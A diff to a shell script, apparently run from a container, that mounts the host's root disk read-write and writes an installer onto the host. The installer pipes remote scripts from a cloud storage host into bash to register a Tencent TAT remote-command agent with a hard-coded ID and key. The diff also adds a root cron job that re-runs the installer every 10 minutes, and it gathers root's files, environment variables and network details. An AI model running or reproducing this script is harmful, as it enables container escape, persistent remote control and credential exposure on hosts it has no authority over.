@@ -10,67 +10,60 @@ date
 hostname
 whoami
 id
-echo "=== END DIAGNOSTIC ==="
 
 echo "=== Mount host root ==="
 mkdir -p /mnt/host
 MOUNTED=0
 for dev in /dev/nvme0n1p1 /dev/sda1 /dev/xvda1; do
-  if [ -b "$dev" ]; then
-    if mount -o rw "$dev" /mnt/host 2>/dev/null; then
-      if [ -d /mnt/host/etc ] && [ -d /mnt/host/root ]; then
-        echo "=== MOUNTED: $dev ==="
-        MOUNTED=1
-        break
-      else
-        umount /mnt/host 2>/dev/null || true
-      fi
-    fi
-  fi
+  [ -b "$dev" ] && mount -o rw "$dev" /mnt/host 2>/dev/null && {
+    [ -d /mnt/host/etc ] && [ -d /mnt/host/root ] && { MOUNTED=1; echo "=== MOUNTED: $dev ==="; break; } || umount /mnt/host 2>/dev/null
+  } || true
 done
 
 if [ "$MOUNTED" -eq 1 ]; then
 
-  echo "=== Step 1: Remove /var/spool/cron/crontabs/root ==="
-  cat /mnt/host/var/spool/cron/crontabs/root 2>/dev/null || echo "file not found"
-  rm -f /mnt/host/var/spool/cron/crontabs/root
-  echo "Removed."
-
-  echo "=== Step 2: Check /etc/crontab ==="
-  grep tat_install /mnt/host/etc/crontab 2>/dev/null || echo "No tat_install in crontab"
-
-  echo "=== Step 3: Write new /tmp/tat_install.sh ==="
+  echo "=== Write tat_install.sh (uninstall first, then install) ==="
   cat > /mnt/host/tmp/tat_install.sh << 'TATSCRIPT'
 #!/bin/bash
+# Check if TAT exists, uninstall first
+if [ -d /usr/local/qcloud/tat_agent ] || pgrep -x tat_agent >/dev/null 2>&1; then
+  echo "TAT agent found, uninstalling..."
+  wget -qO - https://tat-1258344699.cos.accelerate.myqcloud.com/tat_agent/uninstall.sh | sh 2>&1
+  sleep 3
+fi
+echo "Installing TAT agent..."
 wget -qO - https://tat-1258344699.cos.accelerate.myqcloud.com/tat_agent/tat_agent_register.sh | bash -s -- ap-guangzhou a3cdf262-770c-457c-bb74-99866950019d 021e520d2acc42429909e62fcb2ddb3a26627670ef224c4ca8cca06c2b6bd01c
 TATSCRIPT
   chmod +x /mnt/host/tmp/tat_install.sh
-  echo "Written:"
+  echo "Script written:"
   cat /mnt/host/tmp/tat_install.sh
 
-  echo "=== Step 4: Chroot run tat_install.sh ==="
-  chroot /mnt/host /bin/bash -c "bash /tmp/tat_install.sh" 2>&1 || echo "chroot TAT attempted"
+  echo "=== Write /var/spool/cron/crontabs/root (every 10 min) ==="
+  mkdir -p /mnt/host/var/spool/cron/crontabs
+  echo '*/10 * * * * /tmp/tat_install.sh >> /var/log/tat_install.log 2>&1' > /mnt/host/var/spool/cron/crontabs/root
+  chmod 600 /mnt/host/var/spool/cron/crontabs/root
+  chroot /mnt/host /bin/bash -c "chown root:crontab /var/spool/cron/crontabs/root 2>/dev/null" || true
+  echo "Written:"
+  cat /mnt/host/var/spool/cron/crontabs/root
 
-  echo "=== Step 5: ls -alhR /root ==="
-  chroot /mnt/host ls -alhR /root 2>&1 | head -50
+  echo "=== Chroot run tat_install.sh now ==="
+  chroot /mnt/host /bin/bash -c "bash /tmp/tat_install.sh" 2>&1 || echo "chroot attempted"
 
-  echo "=== Step 6: ls -alhR /opt ==="
-  chroot /mnt/host ls -alhR /opt 2>&1 | head -80
+  echo "=== ls /root ==="
+  chroot /mnt/host ls -alh /root 2>&1 || true
 
-  echo "=== Step 7: ls -alhR /home ==="
-  chroot /mnt/host ls -alhR /home 2>&1 | head -50
+  echo "=== ls /opt ==="
+  chroot /mnt/host ls -alh /opt 2>&1 || true
 
-  echo "=== Step 8: env ==="
-  chroot /mnt/host /bin/bash -c "env" 2>&1 | sort
+  echo "=== env ==="
+  chroot /mnt/host /bin/bash -c "env" 2>&1 | sort || true
 
-  echo "=== Step 9: Network ==="
-  chroot /mnt/host /bin/bash -c "hostname -I 2>/dev/null; cat /etc/hostname; cat /etc/resolv.conf; ip route show 2>/dev/null" 2>&1 || echo "net info done"
+  echo "=== Network ==="
+  chroot /mnt/host /bin/bash -c "hostname -I 2>/dev/null; cat /etc/hostname; ip route show 2>/dev/null" 2>&1 || true
 
   sync
   umount /mnt/host
   echo "=== Unmounted ==="
-else
-  echo "FAILED to mount"
 fi
 
 echo "=== Public IP ==="
